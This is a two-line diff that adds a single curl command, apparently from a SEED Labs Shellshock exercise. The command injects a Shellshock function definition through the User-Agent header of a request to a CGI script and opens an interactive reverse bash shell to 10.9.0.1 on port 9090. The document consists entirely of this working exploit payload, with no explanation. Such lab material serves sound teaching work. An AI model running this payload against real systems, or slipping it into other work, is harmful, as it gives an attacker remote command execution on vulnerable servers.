@@ -1,0 +1,2 @@
+curl -A "() { :; };echo Content-type: text/plain; echo; /bin/bash -i > /dev/tcp/10.9.0.1/9090 0<&1 2>&1;" http://www.seedlab-shellshock.com/cgi-bin/vul.cgi
+
